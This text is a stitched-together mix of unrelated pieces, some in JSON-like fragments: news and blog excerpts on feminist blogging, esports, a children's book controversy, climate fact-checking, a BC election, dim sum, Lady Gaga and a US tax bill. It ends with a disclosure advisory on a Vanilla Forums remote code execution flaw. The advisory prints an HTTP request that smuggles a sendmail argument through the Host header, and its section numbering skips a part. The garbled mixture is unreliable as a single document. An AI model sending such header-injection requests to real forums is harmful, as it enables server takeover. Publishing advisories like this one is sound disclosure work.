controversial blogs (i.e. parenting blog sites), because the very nature of feminist blogs is to “resist the status quo.” Coulson’s report suggests more research is needed to explore the factors that cause burnout in the feminist blogosphere.\n\nThe research contained in this new report is especially interesting given the findings of an informal survey conducted by WAM! Vancouver co-founder Joanna Chiu, who, in the fall of 2011, asked self-identified Canadian feminists about their blog reading habits. In this small survey, 76 per cent of respondents could not identify with more than three Canadian feminist blogs, and 80 per cent said they read American feminist blogs more often than Canadian feminist blogs. Finding Canadian feminist blogs on the Internet is not an easy feat, and Coulson believes this is largely due to the lack of centralization and categorization of the Canadian feminist blogs themselves.\n\nWAM! Vancouver invites bloggers, feminist advocates and members of the media to excerpt and to share information from the report, ensuring attribution to Coulson and WAM! Vancouver.

Many “known” players, even amateurs, already feel a great deal of entitlement within the scene due to their popularity, and are not as grateful for the opportunities they are given. This is certainly not to be said of everyone, but I am specifically looking for people who are willing to commit everything to the opportunity which they are given. I want the no ego, pure drive, only care about results mentality. I think there is a lot of undiscovered talent still out there in the NA scene, and I intend to find it.\n\nThe other thing people fail to realize is that it’s not as easy as randomly selecting 5 good players, putting them on a team, and pressing the “go” button. I am not looking to commit the organization and my resources to anything less than a team I feel supremely confident about. There have been several players I have approached about doing a challenger team with me, but I have yet to find a complete roster of those who I think will work.\n\nAs far as my participation on the challenger team is concerned, that is still completely undecided. I would either be coaching the team or playing on it myself, but it really just depends on if I’m able to find enough players where I don’t feel I need to play on the team myself. As a coach who isn’t also a player on the team and an unbiased third party, I am more able to objectively give feedback on the guys performance and help dictate to them the areas in which they need to improve.\n\nI hope that explains that situation to everyone though, now let’s talk about the results from the NA Playoffs and how I think things will pan out at World’s.\n\nPAX RESULTS and NA PERFORMANCE AT WORLD’S\n\nThe third place match went pretty much exactly as I expected yesterday. While Dignitas is a good team, based on the team’s scrims this week, everyone on CLG expected Vulcun would have little issue in claiming their spot at World’s. Now, the Finals were arguable more interesting (purely from a results perspective, because the actual finals themselves were quite boring). C9 had been telling us that TSM had been beating them in 80% of their scrims in prepping for PAX. Yet, yesterday, C9 completely dismantled TSM who had looked so strong against CLG and Vulcun earlier in the tournament. So what does this all mean?\n\nIn the end, I think the three teams going to World’s are the ones who deserve it most, and that they will do a very good job representing NA at World’s. If you still don’t see it after the finals yesterday against TSM, I am telling you now, Cloud 9 is fucking good at League of Legends. In fact, I think people still underrate them. Cloud 9 is, in my opinion, on the level of top Korean teams. When watching OGN, there are many top level Korean games between the likes of Blaze, Frost, Ozone, SKT T1, KT B, and the like where I don’t feel that they rotate, prioritize objectives, apply pressure, or choose lane matchups as well as Cloud 9. So how will Cloud 9 match up against the Korean team’s that go to World’s?\n\nI think Cloud 9’s greatest fear against the Korean teams at World’s will be in laning phase. Mechanically, and in regards to individual outplays, I think there is a high possibility that Cloud 9 could get bullied in lane so badly by the Koreans, especially with Meteos’ tendency to farm over gank, that they will never get an opportunity to play the kind of game that C9 likes. However, if C9 is able to make it past laning phase in the same position that they are able to against NA teams, I don’t think Koreans will know how to deal with a jungler that is so much more farmed than their own. Cloud 9’s performance at World’s will depend largely on how seriously the Koreans take them and how they are able to fare in lane against the best players in the World. I would not favor ANY team over Cloud 9 except for the Korean team’s at Worlds however. They could easily have a very easy route to the semi finals and potentially even the finals depending on the draws coming out of groups.\n\nTSM and Vulcun are a much greater unknown. TSM is looking very strong right now, but has still never beaten a Korean team. Vulcun has the potential to play better than any team in NA, but are far more inconsistent than Cloud 9 and consistently give opportunities for other teams to come back into the game, which top international teams will punish to a great degree. I expect one of these teams to make it past groups to the quarter finals. Beyond that is unknown. Anyone who draws the SouthEast Asian team which has a bye, in the quarter finals has a potentially very easy route to the semi finals.\n\nThe rest of the day\n\nAfter the matches I toured around PAX some and then went to a wonderful dinner + play session Riot hosted for players/managers/owners at GameWorks across the street from the venue. I am a huge gamer, so in my final blog from PAX (tomorrow), I will write about what games I saw at PAX that excited me most and people should check out. We are also hosting a signing with iBUYPOWER at the NVIDIA booth today at PAX at 1pm. Be sure to come by and get your stuff signed and hang out!",

But if that concern were genuine, I don't think the book would have been released in the first place.\"\n\nCampbell, who works at Indiana State University, has been a vocal critic of A Birthday Cake for George Washington. She reviewed the book on her blog and the post was shared widely — along with the hashtag #slaverywithasmile.\n\nThe cover of the book \"\"A Birthday Cake for George Washington\" by Ramin Ganeshram. (Scholastic/AP)\n\nThe book tells the story a real-life slave named Hercules, as he prepares to bake a cake for George Washington's birthday. Throughout the book, Hercules is seen happily working with a big smile on his face.\n\nThe illustrator's notes at the beginning of the book read: \"While slavery in America was a vast injustice, my research indicates that Hercules and the other servants in George Washington's kitchen took great pride in their ability to cook for a man of such stature. That is why I have depicted them as happy people.\"\n\nBut many critics, including Campbell, say this is historically inaccurate.\n\n\"I've read a lot in the past week about Hercules and George Washington's slaves. I've studied enslavement in that time period.

  "latent_20202": "The internet represents an extraordinary opportunity for democracy. Never before has it been possible for people from all over the world to access the latest information and collectively seek solutions to the challenges which face our planet, and not a moment too soon: the year 2015 was the hottest in human history, and the Great Barrier Reef is suffering the consequences of warming oceans right now.\n\nYet despite the scientific consensus that global warming is real and primarily due to human activity, studies show that only about half the population in some countries with among the highest CO 2 emissions per capita understand that human beings are the driving force of our changing climate. Even fewer people are aware of the scientific consensus on this question. We live in an information age, but the information isn’t getting through. How can this be?\n\nWhile the internet puts information at our fingertips, it has also allowed misinformation to sow doubt and confusion in the minds of many of those whose opinions and votes will determine the future of the planet. And up to now scientists have been on the back foot in countering the spread of this misinformation and pointing the public to trustworthy sources of information on climate change.\n\nClimate Feedback intends to change that. It brings together a global network of scientists who use a new web-annotation platform to provide feedback on climate change reporting. Their comments, which bring context and insights from the latest research, and point out factual and logical errors where they exist, remain layered over the target article in the public domain. You can read them for yourself, right in your browser. The scientists also provide a score on a five-point scale to let you know whether the article is consistent with the science. For the first time, Climate Feedback allows you to check whether you can trust the latest breaking story on climate change.\n\nFacebook Twitter Pinterest An example of Climate Feedback in action. Scientists’ comments and ratings appear as a layer over the article. Text annotated with Hypothesis is highlighted in yellow in the web browser and scientists’ comments appear in a sidebar next to the article. Illustration: Climate Feedback\n\nLast year the scientists looked at some influential content. Take the Pope’s encyclical, for instance. The scientists gave those parts of the encyclical relating to climate science a stamp of approval. Other “feedbacks,” as we call them, have made a lasting impact. When the scientists found that an article in The Telegraph misrepresented recent research by claiming that the world faced an impending ice age, the newspaper issued a public correction and substantially modified the online text.\n\nBut there’s more work to be done. Toward the end of the year the scientists carried out a series of evaluations of some of Forbes magazine’s reporting on climate change. The results give an idea of the scale of the problem we’re tackling. Two of the magazine’s most popular articles for 2015, one of which attracted almost one million hits, turned out to be profoundly inaccurate and misleading. Both articles, reviewed by nine and twelve scientists, unanimously received the lowest possible scientific credibility rating. This rarely occurs, and just in case you’re wondering, yes, the scientists do score articles independently: ratings are only revealed once all scientists have completed their review.\n\nWe argue that scientists have a moral duty to speak up when they see misinformation masquerading as science. Up to now scientists have however had little choice but to engage in time-consuming op-ed exchanges, which result in one or two high-profile scientists arguing against the views of an individual who may have no commitment to scientific accuracy at all. Climate Feedback takes a different approach. Our collective reviews allow scientists from all over the world to provide feedback in a timely, effective manner. We then publish an accessible synthesis of their responses, and provide feedback to editors so that they can improve the accuracy of their reporting.\n\nWe’ve got proof of concept. Now we need to scale up, and for that we need the support of everyone who values accuracy in reporting on one of the most critical challenges facing our planet. Climate Feedback won’t reach its full potential until we start measuring the credibility of news outlets in a systematic way. We want to be in a position to carry out an analysis of any influential internet article on climate change. We want to develop a ‘Scientific Trust Tracker’ – an index of how credible major news sources are when it comes to climate change.\n\nWe’re all increasingly relying on the internet to get our news. But the internet has engendered a competitive media environment where in the race to attract the most hits, sensational headlines can trump sober facts. We’re building into the system a new incentive for journalists with integrity to get ahead. Some journalists are already coming to us, asking our network of scientists to look at their work. We want readers to know which sources they can trust. We want editors to think twice before they publish ideological rather than evidence-based reporting on global warming.\n\nOn Friday 22 April 2016, more than 170 countries signed the Paris climate agreement. But this unprecedented international treaty will lead to real action only if the leaders of those countries can garner popular support for the measures needed to curb greenhouse gas emissions. The fate of the Paris deal lies largely in the hands of voters in democratic countries, and we cannot expect democracies to produce good policy responses to challenges of climate change if voters have a confused understanding of reality.\n\nScientists from all over the world are standing up for better informed democracies. You can help them make their voices heard. We invite you to stand with us for a better internet. We invite you to stand with science.\n\nDaniel Nethery is the associate editor and Emmanuel Vincent is the founder of Climate Feedback. Climate Feedback is launching a crowdfunding campaign today.

  "latent_20269": "British Columbia's provincial election campaign officially kicks off on Tuesday and voters are already armed with some clear choices after both main parties issued substantial platform promises even before the Lieutenant-Governor dissolves the legislature.\n\nThe governing BC Liberals released their full platform on Monday, offering to keep B.C. on its current path of encouraging resource development and embracing fiscal restraint in government with modest new spending promises.\n\nIt is a package crafted for maximum contrast with that of the rival New Democratic Party, which hopes to unseat the four-term Liberal incumbents with promises of populist measures including Quebec-style daycare subsidies and a raft of tax and fee reductions.\n\nStory continues below advertisement\n\nRead more: Rocky political start shows B.C.'s Clark willing to take some risks\n\nRead more: B.C. politicians prepare for the ground war\n\nB.C. Premier Christy Clark, using a downtown Vancouver technology firm's airy office space as the backdrop for her platform announcement, barely touched on her party's new spending commitments – $50-million in new money this year on top of the province's $50-billion budget – in her remarks.\n\n\"This election is about which party has a plan to do three things: Create jobs, control government spending, and control taxes for the middle class,\" she said. \"Most important, though, is creating jobs.\"\n\nThe 28-day election campaign formally begins on Tuesday, when Ms. Clark goes to Government House in Victoria to drop the writ. The BC Liberals are seeking re-election after 16 years in power, and a central theme in the party's platform is a pledge to continue to balance the budget after posting five successive surpluses.\n\nThe New Democrats have not won an election in British Columbia since 1996, and were almost wiped off the political map in 2001. They were widely expected to regain power in 2013, and under then-leader Adrian Dix, ran a cautious \"Liberal light\" campaign that eschewed negative ads.\n\nMs. Clark, whose party did not hold back on sharp attacks on the NDP, won another comfortable majority after sticking relentlessly to her jobs-and-the-economy mantra. It is a strategy she intends to employ again, even as her party faces complaints about its rich cash-for-access fundraising, its watered-down climate-action plan and its refusal to raise welfare rates after 10 years.\n\nStory continues below advertisement\n\nStory continues below advertisement\n\nThe NDP, with John Horgan as its new leader, has vowed to \"prosecute\" the Liberals this time out and to give voters a clearer alternative.\n\nThe most expensive measure in the Liberal platform – one that takes aim at voters in key battleground ridings in the suburbs around Vancouver – is a promise to cap bridge-crossing tolls for drivers in Metro Vancouver starting next year.\n\nThe promise falls short of the NDP's pledge to eliminate tolls on the Port Mann and Golden Ears bridges, but Ms. Clark said voters should appreciate the difference.\n\n\"We're doing what we can afford to do,\" she told reporters. The Liberals would cap tolls at $500 annually per driver, a measure that is expected to benefit 42,000 drivers, based on current use. \"There's nothing reckless about it,\" she said.\n\nFinance Minister Mike de Jong said the unspecified price tag of the NDP plan on tolls would cost the province the coveted triple-A credit rating that keeps its debt-servicing costs down. \"It will guarantee a credit downgrade,\" he said.\n\nMr. Horgan is expected to release the NDP platform on Thursday, and said detailed costs of his party's promises will be provided then. The NDP has already committed to a $10-a-day daycare program modelled on Quebec's, to freeze BC Hydro rates, and to eliminate the province's Medical Services Premiums.\n\nStory continues below advertisement\n\n\"I believe the role of government is to make life easier for people, not harder,\" Mr. Horgan told reporters at a campaign event in Delta.\n\nMr. Horgan also said his platform would deal with a question he declined to answer on Monday – whether an NDP government would run deficits to pay for its promises.\n\nMr. Horgan has adopted a populist tone in NDP messaging. \"For too long, the people at the top have had their premier,\" he said. \"I believe it's time there was a premier working for you, and that's what I intend to do.\"\n\nMs. Clark, who frequently campaigned in a hardhat in 2013, this time chose a sedate tech firm to unveil her platform. The technology sector is growing and Ms. Clark said her government's policies will fuel that expansion. But she also promised to continue to push for the liquefied natural gas sector that was a central – and as-yet unfulfilled – plank in her 2013 campaign.\n\nB.C.'s natural gas sector has struggled due to low commodity prices that have delayed hoped-for investment in new LNG facilities. However, Ms. Clark called the sector a \"sunrise industry\" that is needed to help pay for public services.\n\n\"We will unlock the vast potential of the Montney [shale gas] formation and its reserves of natural gas and light oil.\" Her party also promises to continue to freeze its carbon tax until 2021.\n\nStory continues below advertisement\n\nWith a report from Ian Bailey in Delta, B.C.",
  "latent_20428": "1 of 5 2 of 5\n\nNeed something to do this weekend? Here are five dim sum spots where you can ring in the Year of the Rooster.\n\nGolden Swan Restaurant, 5380 Victoria Drive\n\nIf you’re going to participate in the age-old tradition of digging into dim sum for Lunar New Year, you may as well do it up old-school at a joint that remains committed to the carts.\n\nYou know the ones we’re talking about: tiny stainless-steel trolleys stacked high with steaming bamboo baskets and pushed by cordial Chinese women whose loud calls of “Har gow, siu mai!” somehow manage to sound at once shrill and soothing. In fact, the push-cart system is how dim sum was originally served in the ’60s, though many Chinese restaurants have since adopted the à la carte method, which helps improve efficiency in the kitchen.\n\nLuckily for the staunch traditionalists among us, however, Vancouver’s Golden Swan still offers its award-winning dim sum by wheel, treating a full house every weekend to standby dishes like steamed chicken feet, taro-root dumplings, beef noodle rolls, and deep-fried sesame balls.\n\nThe kitchen also cranks out specialties such as shredded duck vermicelli, pan-fried gai lan, and seafood noodle soup if you’re feeling fancy. (It is a special occasion, after all.) Reservations are suggested unless you enjoy loitering in tight entrances for 45-plus minutes. This place gets packed—and noisy.\n\nTammy Kwan\n\nGrand Palace Restaurant, 1163 Pinetree Way, Coquitlam\n\nEveryone knows that the Evergreen Line is now open, bringing rapid transit all the way into suburbs that city-dwellers don’t usually venture to. But what you don’t know is that there is a popular Chinese restaurant in Coquitlam that is now only a SkyTrain ride away—and it serves up tasty dim sum.\n\nIf you’re a first-timer trying out these Chinese dishes, we suggest going for the classic baskets of har gow (steamed shrimp dumplings) and siu mai (pork and mushroom dumplings). Other popular dim-sum items at this always bustling eatery include chicken feet in bean sauce, steamed barbecue pork buns, steamed spareribs with garlic, and custard egg tarts.\n\nIf you’re not full from the baskets of food, its menu offers a variety of fried rice and noodle dishes. It’s not unusual for a large lineup to wait at the front of Grand Palace on the weekends, so be sure to make a reservation ahead of time.\n\nStephen Hui\n\n3G Vegetarian Restaurant, 3424 Cambie Street\n\nLet’s face it: the Chinese aren’t exactly known for adhering to specific dietary restrictions. But if there was one place (besides Buddhist temples) a meat-free Chinese restaurant could thrive, it’d be Vancouver.\n\nEnter 3G, a culinary destination tucked away in the Cambie Village that has been attracting local vegans and vegetarians for years. Sure, some may scoff at the idea of dumplings sans shrimp or cha siu bao without the pork—the ingredient is in the name, after all—but 3G somehow manages to craft substitutes that are pretty damn close. (Trust us: the chefs have the textures down pat.)\n\nDon’t skip the sweet-and-sour “chicken”, braised tofu covered in mushroom sauce, and the veggie wonton with soup. To kick off an auspicious Year of the Rooster, enjoy a plate of stir-fried rice or Singapore-style noodles (the long, uncut length of the carbs symbolizes an extended life) or the deep-fried “veggie fish”. (The Chinese pronunciation of fish, yu, is a homophone of the term denoting an increase in prosperity.)\n\nPink Pearl Chinese Restaurant\n\nPink Pearl Chinese Restaurant, 1132 East Hastings Street\n\nThe Pink Pearl proudly bills itself as having served Vancouver since 1981, but that’s not entirely accurate. In 2009, a two-alarm fire ripped through the kitchen in the early hours of the morning, after which the restaurant sat vacant for three years.\n\nWhen the Pink Pearl reopened in 2012, the good news was that not much had changed. The room is still one of the largest in Vancouver. Despite its cavernous size, lineups are often a given, which testifies to the fact that the restaurant was one of the earliest—and most beloved—go-to-spots for dim sum in the Lower Mainland.\n\nThose who had their first-ever steamed basket of har gow or siu mai at the Pink Pearl haven’t abandoned the place for more high-falutin’ rooms. Luckily, because of its size, the wait for a table is never long, and a food carts tend to roll by every couple of minutes. Adventurous types can opt for the Phoenix Talons (more commonly known as chicken feet or steamed bible tripe (cow stomach seasoned with ginger and green onion).\n\nAs for us, nothing beats the beef rice noodle roll, which—we’re ashamed to say—we’ve gotten no better at picking up with chopsticks than our Trans Am–driving parents were back when the Pink Pearl first threw open its doors in ’81. Some things never change.\n\nTammy Kwan\n\nKirin Restaurant at Starlight Casino, 350 Gifford Street, New Westminster\n\nMany people make their way to Starlight Casino not for gambling, but for another purpose: to eat good dim sum.\n\nNew Westminster’s Kirin Restaurant is known for its high-end Chinese dining atmosphere and its seafood-heavy banquet dinner menus. But for the breakfast and lunch crowd, it’s all about the dim sum.\n\nThis establishment is also popular among those who don’t want to brave the parking chaos at Richmond eateries on the weekends. Some of our favourite dim-sum baskets here include crispy spring rolls, barbecue-pork pineapple buns, shrimp-and-chive rice rolls, and fried scallop and taro.\n\nFor dessert, go for the egg tarts wrapped in a flaky crust or the sesame paste covered in crushed peanuts. If you’re visiting with a larger group, you might want to order multiple baskets of each item—just in case someone gets upset that they didn’t get to try the barbecue bun.",

This will mark Gaga’s first starring role in a major production as an actress.\n\nThe new theme of the season, and the title, is American Horror Story: Hotel, as revealed by Gaga herself in a video tweet (below). It’s not yet know what kind of character she will play.\n\nThe move follows the “Bad Romance” singer’s head-turning performance at the Oscars on Sunday where she surprised fans accustomed to her wild outfits and heavily produced pop hits by taking the stage in a traditional flowing white gown and belting out a full-throated tribute to The Sound of Music. One Time critic declared the performance “could redefine her career.”\n\nNow she’s taking an even more unexpected turn by joining the cast of a TV series albeit one that’s critically acclaimed and has plenty of theatrical elements that one could imagine appealing to the singer. Plus, like HBO’s star-drawing True Detective, FX’s horror series boasts a format that appeals to in-demand performers since stars can commit to only a single season and still have a starring role.\n\nYet one question that some will certainly ask: Can Gaga pull off a sustained acting gig? Her prior acting credits are in music videos and short scenes — most significantly minor roles in Men in Black 3, and director Robert Rodriguez’s Machete Kills (clip below) and Sin City 2: A Dame to Kill For. Rodriguez said he was impressed by her performance and told E! she could have a long acting career if she pursued one. “She would be fantastic,” Rodriguez said. “The camera loves her. She’s a great performer. She’s performed twice for me now and I was blown away by her discipline. She studied acting before she became a singer and you could really tell.”\n\nGaga previously worked with AHS co-creator Ryan Murphy when she lent the use of her songs to his Fox musical comedy Glee in 2010. “I love Glee,” she said at the time. “I love the cast and the creativity of the writers. I went to a musical theater school and used to dream that some day the students would be singing my songs.” Next for the show: AHS will close PaleyFest in Los Angeles on March 15 with a panel from last year’s Freak Show edition along with executive producer Tim Minear — and there’s sure to be a curious question or two about next season and Gaga’s role.

  "latent_20557": "The bill would reshape the tax code in favor of corporations and do more to undercut Obamacare than anything Republicans have yet managed to pass.\n\nChip Somodevilla / Getty Images\n\nSenate Republicans passed their version of a massive tax overhaul just before 2 a.m. Saturday morning, knocking off one more obstacle to President Donald Trump and the Republican Congress's first major legislative achievement this year. The bill — the final text of which was released publicly after 9:30 p.m. Friday, and still contained scribbles in the margins — would vastly rewrite how the US tax code works, favoring corporations large and small, owned by a few partners or by a globally diversified shareholder base. The bill would also be Trump and the Republican Congress's biggest step in unwinding the Affordable Care Act, as it would eliminate the individual mandate to buy health insurance. The Congressional Budget Office estimates that the change would jack up premiums and lead to 13 million more uninsured people than there would otherwise be in 10 years, and 4 million more in 2019. The Senate passed the bill 51–49, with Sen. Bob Corker the only Republican voting against the bill. Vice President Mike Pence was on hand to preside over the vote, and was met with applause after reading out the final tally. Frustrated Democrats, meanwhile, had abandoned the floor after voting. Speaking to reporters as he left the White House for New York City on Saturday morning, President Trump praised the senators for passing \"tremendous tax reform.\" \"People are going to be very, very happy. They're going to get tremendous, tremendous tax cuts and tax relief, and that's what this country needs,\" he said.\n\nTrump this morning on tax bill: \"It was the biggest package in terms of tax cuts ever passed in our country...peopl… https://t.co/zFSba1z6Lz\n\nThe next step for the legislation is up to the House of Representatives. The House can either pass the Senate's bill as is, or go to conference with the Senate to meld the bill with the legislation House Republicans recently passed. The House bill has a different structure for individual tax rates and a different approach to taxing businesses run by their owners than the Senate bill, and it includes a complete elimination of the estate tax. The House bill also scraps the deduction people can claim for medical expenses and puts the 20% corporate rate into effect faster. House leadership is currently planning on moving to a conference to combine the bills as quickly as possible. In a statement Saturday morning, House Speaker Paul Ryan congratulated Senate Republicans on the bill and said, \"Now we will move quickly to a conference committee so we can get a final bill to President Trump’s desk.\" Trump tweeted just before 3 a.m. on Saturday that he hopes to reach that point before the end of the year.\n\nWe are one step closer to delivering MASSIVE tax cuts for working families across America.

Senate leadership appeared to have secured 51 votes for the bill Friday afternoon, well before the bill was finalized. \"I'm ecstatic,\" Sen. David Perdue told BuzzFeed News late Friday night.\n\nThe publicly released Senate tax bill they're voting on tonight still has the infamous scribbles\n\nSenate Democrats were livid about the bill and the process that played out Friday night, as a flow of late changes were made to the bill just before it came to the floor for a vote. \"Historians will mark today as one of the darkest black-letter days in the long history of the Senate,\" Senate Minority Leader Chuck Schumer said from the floor, soon before the vote. The bill, he said, \"was chock full of special-interest giveaways before tonight, but under the cover of darkness and with the aid of haste, a flurry of last-minute changes will stuff even more money into the pockets of the wealthy and the biggest corporations, while raising taxes on millions in the middle class.\"\n\nMcConnell hit back at Schumer in his own comments after the vote. \"You complain about process when you're losing,\" he said. Senate Democrats seized upon one obscure amendment late Friday night that they claimed would exempt a single Michigan liberal arts school, Hillsdale College, from a new tax on endowment income. The college is a conservative beacon in the culturally liberal higher education world. It rejects most federal funding, including student loans, and many of its students go on to work in conservative movement institutions. Erik Prince, the brother of Education Secretary Betsy DeVos and founder of the controversial security firm Blackwater, is one prominent alumnus. Sen. Pat Toomey, who included the amendment, defended the college on the Senate floor. \"I actually think it's a wonderful institution... I commend them for their choice, as other colleges, of foregoing taxpayer money that they could be taking... I think any college in that category, whether it's Hillsdale or any other college, ought not to have to pay the tax on endowment.\"\n\nSchumer described the amendment as a \"metaphor for the whole bill.\" The fate of the amendment, though, proved a lonely bright spot for Democrats: It was defeated just after 1 a.m., soon before the final vote, with four Republicans joining all Democrats in voting against it.\n\nI was just handed a 479-page tax bill a few hours before the vote. One page literally has hand scribbled policy cha… https://t.co/JdMIEfWZgj\n\nIn order to pay for at least some of the large cuts in the Senate plan — businesses run by their owners would be able to deduct 23% of their income before paying taxes, while the rate paid by corporations on their income would fall to 20% — a wide swathe of deductions enjoyed by higher-income wage earners would fall away, notably the deduction for state and local taxes.\n\nThe amount that these businesses — which include everything from dry cleaners to real estate partnerships — would be able to deduct from their tax bills was a key point of contention among Republicans going into Friday. Sens. Steve Daines and Ron Johnson only came on board with the bill Friday morning, after the deduction moved up from 17.4% to 23% over the past week. In order to pay for broader and deeper cuts, the Senate also scrapped their total repeal of the alternative minimum tax for individuals — a separate tax system that's supposed to ensure that people don't use deductions to excessively wipe out their tax liability. Getting rid of the AMT was supposed to be one of the ways the House and Senate tax bills would simplify the code. Instead, the Senate put the tax system back into the bill with modifications on Friday. The House bill eliminates the tax.\n\nThroughout Friday, senators who had held out because of their concern about tax cuts not being extensive enough won key concessions, while those that were on the fence because they thought the bill would expand deficits too much walked away with less solid commitments. Sen. Susan Collins, the Maine Republican who voted against the Senate's health care bill and was viewed as a key vote for the tax plan, got several amendments into the bill, including letting taxpayers deduct the first $10,000 of their property tax bills from their federal taxes. \"I think we should be cutting everyone’s taxes,\" Sen. Ted Cruz said. \"Susan Collins prevailed in amending the bill to exclude $10,000 of property taxes from your federal income tax liability — that's a significant improvement.\" As the bill was being rewritten Thursday night and through Friday, Republicans were able to scrounge up money to allow them to further cut taxes without increasing the cost of the bill, but rejected entirely proposals to reduce the fiscal impact as a whole. After the bill hit a snag Thursday night, Republicans were discussing adding automatic increases in the corporate tax from its proposed 20% rate in order to eliminate at least $350 billion in added debt over the next 10 years. This was at the urging of Sen. Bob Corker, who had earlier proposed an automatic tax hike if the bill didn't raise enough money from added economic growth. That so-called \"trigger\" option was rejected by the Senate parliamentarian due to rules that allowed the Senate to pass the bill with only a bare majority of votes, leaving the Senate to look elsewhere for ways to assuage Corker as well as Sen. Jeff Flake. By Friday morning, however, the tax hikes were dead. \"It was extended conversation that went on into the late hours of the night and continued early in the morning,\" Cruz said Friday, explaining how the Senate came to reject the hikes entirely. \"I and a number of other senators had strong objections to that proposal, and that proposal did not carry the day. The $350 billion in tax increases is not in the bill — that was the right thing to do.\" Corker was unable to bring any Republicans with him to vote against the bill — Sens. James Lankford and Jeff Flake, who had originally supported a \"trigger\" mechanism and did not declare their position on the bill until late this week, did not join Corker. \"I’ve never tried to rally [them] — each person has to vote their conscience and that’s what this is all about,\" Corker said. \"I am disappointed. I wanted to get to yes. But at the end of the day, I am not able to cast aside my fiscal concerns and vote for legislation that I believe, based on the information I currently have, could deepen the debt burden on future generations,\" Corker said in a statement. \"I’m a dinosaur on the fiscal issues,\" he said earlier Friday. Other Republicans mainly had praise for Corker, despite his dissenting vote. \"I respect Bob so much as senator,\" Perdue told BuzzFeed News late Friday night. Trump and Corker \"had a really great conversation,\" he added. \"Bob called the president; there was a clearing of the minds. It was very professional. I'm sure the President tried to beseech him. I'm very impressed with Bob and how he handled this.\"\n\nAlex Wong / Getty Images Sen. Corker on Nov. 30.",

VULNERABILITY ------------------------- Vanilla Forums <= 2.3 Unauth. Remote Code Execution (RCE) exploit CVE-2016-10033 [0day] II. BACKGROUND ------------------------- \"Community Forums Reinvented Create an online community that your customers will love. Vanilla's forum software is used by top brands to engage customers, drive loyalty and reduce support costs.\" \"Vanilla provides cloud and open source community forum software that powers discussion forums worldwide with close to 1M downloads. Built for flexibility and integration, Vanilla is the best, most powerful community solution in the world.\" https://vanillaforums.com/en/software/ https://open.vanillaforums.com/ III. INTRODUCTION ------------------------- Vanilla Forums software (including the latest stable version of 2.3 in its default configuration) is affected by: * Remote Code Execution CVE-2016-10033 (0day) which can be exploited by unauthenticated remote attackers to execute arbitrary code and fully compromise the target application when combined with Host Header injection vulnerability CVE-2016-10073 (described in a separate advisory). IV. DESCRIPTION ------------------------- As described in the advisory of CVE-2016-10073: The HOST header is used to form the sender email address as we can see in the following snippet of code: ------[ library/core/class.email.php ]------ ... public function from($SenderEmail = '', $SenderName = '', $bOverrideSender = false) { if ($SenderEmail == '') { $SenderEmail = c('Garden.Email.SupportAddress', ''); if (!$SenderEmail) { $SenderEmail = 'noreply@'.Gdn::request()->host(); } } if ($SenderName == '') { $SenderName = c('Garden.Email.SupportName', c('Garden.Title', '')); } if ($this->PhpMailer->Sender == '' || $bOverrideSender) { $this->PhpMailer->Sender = $SenderEmail; } ob_start(); $this->PhpMailer->setFrom($SenderEmail, $SenderName, false); ob_end_clean(); return $this; } ... ----------------------------------------- In default configuration of Vanilla the address is then passed to the phpmailer library as the sender address in the line: $this->PhpMailer->Sender = $SenderEmail; The official stable version 2.3 available at: https://open.vanillaforums.com/addon/vanilla-core-2.3 is bundled with PHPMailer library in version 5.1: -----[ library/vendors/phpmailer/class.phpmailer.php ]---- <?php /*~ class.phpmailer.php | Software: PHPMailer - PHP email class | Version: 5.1 ---------------------------------------------------------- This version of PHPMailer is affected by the: * PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033) vulnerability also discovered by the author of this advisory and described in detail at: https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html Similarly to recently disclosed exploit of WordPress Core 4.6 RCE: https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html remote attackers may exploit the phpmailer vulnerability in Vanilla Forums by passing the payload (additional parameters to /usr/sbin/sendmail) within the HOST header. For example, the following web request: --- POST /vanilla2-3/entry/passwordrequest HTTP/1.1 Host: vanilla-forums-vhost -X Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Connection: close Content-Length: 149 hpt=&Target=discussions&ClientHour=2017-05-10+22%3A00&Email=admin&Request+a+new+password=Request+a+new+password&DeliveryType=VIEW&DeliveryMethod=JSON --- would inject -X parameter at the end of the argument list passed to /usr/bin/sendmail : Arg no. 0 == [/usr/sbin/sendmail] Arg no. 1 == [-t] Arg no. 2 == [-i] Arg no. 3 == [-oi] Arg no. 4 == [-f] Arg no. 5 == [noreply@attackers_server] Arg no. 6 == [-X] NOTE: It should be noted that this vulnerability can still be exploited even if Vanilla software is hosted on Apache web server with several name-based vhosts enabled, and despite not being the default vhost. This is possible as the attacker can take advantage of HTTP/1.0 protocol and specify the exact vhost within the URL. This will allow the HOST header to be set to arbitrary value as the Apache server will obtain the SERVER_NAME from the provided URL. This will ensure that the malicious request will reach the affected code despite invalid vhost within the HOST header. To demonstrate, the above web request could be simply modified to: --- POST http://vanilla-forums-vhost/vanilla2-3/entry/passwordrequest HTTP/1.1 Host: arbitrary-string -X --- to achieve the same effect on a host with multiple vhosts.

VI. BUSINESS IMPACT ------------------------- Upon a successfull exploitation, a remote unauthenticated attacker could remotely execute arbitrary code on the target and fully compromise the application / system on which the application is hosted. VII. SYSTEMS AFFECTED ------------------------- The latest stable release of Vanilla Forums available at the official website: https://open.vanillaforums.com/addon/vanilla-core-2.3 was confirmed to be vulnerable. Previous versions are also likely to be vulnerable. VIII. SOLUTION ------------------------- This vulnerability was reported to Vanilla Forums support team in December 2016 however it has remained unpatched for over 5 months. As there has been no progress in this case , this advisory is finally released to the public without an official patch. As a quick mitigation (before updating the affected PHPMailer library), users can pre-set the support email (sender's address) to a static value to prevent the dynamic creation of the email address / the use of the HOST header.

